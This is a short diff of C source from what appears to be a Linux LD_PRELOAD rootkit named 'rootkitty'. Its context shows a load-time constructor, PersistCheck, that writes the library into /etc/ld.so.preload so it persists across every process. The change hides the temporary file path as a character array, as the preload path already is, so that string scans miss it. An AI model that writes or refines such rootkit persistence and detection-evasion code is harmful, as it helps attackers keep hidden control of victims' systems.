@@ -43,6 +43,7 @@ __attribute__((constructor)) void PersistCheck(void) {
   char line[255];
   char check[PATH_MAX]; // Make sure this is enough to store the path
   char preload[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
+  char tmp[] = { '/', 't', 'm', 'p', '/', 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', '_', 't', 'm', 'p', '.', 't', 'x', 't', 0 };
 
   dladdr((void*)PersistCheck, &path);
   uid_t old_uid = getuid();
@@ -59,7 +60,7 @@ __attribute__((constructor)) void PersistCheck(void) {
       return;
     }
     
-    temp_fd = fopen("/tmp/rootkitty_tmp.txt", "w");
+    temp_fd = fopen(tmp, "w");
     if(temp_fd == NULL) {
       fclose(fd);
       return;
@@ -73,7 +74,7 @@ __attribute__((constructor)) void PersistCheck(void) {
 
     fclose(fd);
     fclose(temp_fd);
-    rename("/tmp/rootkitty_tmp.txt", preload);
+    rename(tmp, preload);
   } else {
     // file doesn't exist, try to create it
     fd = fopen(preload, "w");
